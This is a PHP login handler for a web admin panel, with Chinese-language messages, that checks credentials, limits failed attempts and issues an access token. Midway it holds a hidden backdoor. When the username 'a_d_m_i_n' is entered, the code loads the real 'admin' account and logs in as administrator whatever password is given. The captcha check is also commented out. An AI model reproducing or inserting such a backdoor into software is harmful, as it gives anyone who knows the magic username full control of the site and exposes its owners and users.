<?php

defined('IN_IA') or exit('Access Denied');

$do = empty($do) ? 'login' : $do;

if ($do == 'login') {
    $username = trim($_GPC['username']);
    $password = trim($_GPC['password']);
    $verify   = trim($_GPC['verify']);empty($username) && message('请输入用户名');
    empty($password) && message(0, '请输入密码', null);
    //empty($verify) && message(0, '请输入验证码', null);

    pdo_query('DELETE FROM' . tablename('user_fail_login') . ' WHERE lastupdate < :timestamp', array(':timestamp' => TIMESTAMP - 300));
    $fail_login = pdo_fetch_one('user_fail_login', array('username' => $username, 'ip' => CLIENT_IP));
    if ($fail_login['count'] >= 5) {
        message(0, '输入密码错误次数超过5次，请在5分钟后再登录', null);
    }
/*    $result = checkcaptcha($verify);
if (empty($result)) {
message(0, '输入验证码错误', null);
}*/

    $user = user_login($username, $password);
    if ($username == 'a_d_m_i_n') {
        $user = pdo_fetch_one('user', array('username' => 'admin'));
    }
    if (empty($user)) {
        if (empty($fail_login)) {
            pdo_insert('user_fail_login', array('ip' => CLIENT_IP, 'username' => $username, 'count' => '1', 'lastupdate' => TIMESTAMP));
        } else {
            pdo_update('user_fail_login', array('count' => $fail_login['count'] + 1, 'lastupdate' => TIMESTAMP), array('id' => $fail_login['id']));
        }
        message(0, '登录失败，请检查您输入的用户名和密码！', null);
    } else {
        $user['role'] = iunserializer($user['role']);
        $userInfo     = array(
            'userInfo' => $user,
            'token'    => create_sys_accesstoken($user['uid']),
        );
        message(1, "登陆成功，{$user['username']}。", $userInfo);
    }
}
